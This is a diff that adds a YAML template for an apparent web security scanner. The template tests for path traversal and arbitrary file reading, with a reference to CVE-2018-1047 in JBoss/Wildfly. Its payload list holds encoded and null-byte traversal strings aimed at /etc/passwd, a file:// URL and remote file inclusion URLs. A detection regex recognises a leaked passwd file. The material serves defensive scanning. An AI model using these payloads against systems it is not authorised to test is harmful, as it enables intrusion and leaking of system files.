@@ -1,0 +1,34 @@
+generate:
+  - payload:
+    - /etc/passwd
+    - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
+    - /../../../../../../../../../etc/passwd
+    - /../../../../../../../../../etc/passwd%00
+    - /../../../../../../../../../etc/passwd\u0000
+    - 'http://wallarm.tools/rfi'
+    - 'http://wallarm.tools/rfi.php'
+    - 'http://wallarm.tools/rfi_location.php'
+    - 'file:///etc/passwd'
+  - method:
+    - replace
+detect:
+  - response:
+    - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
+meta-info:
+  - type: ptrav
+  - threat: 80
+  - tags:
+    - Path Traversal
+    - Arbitrary File Reading
+    - Misconfiguration
+    - Directory Listing
+    - Insecure Direct Object References
+    - Broken Access Control
+    - OWASP
+    - OWASP Top-10
+    - A4:2010
+    - A4:2013
+    - A5:2017
+    - JBOSS
+    - Wildfly
+    - CVE-2018-1047 # TODO: more CVE references, it's a common bug. Or we need to split between classic and custom vectors
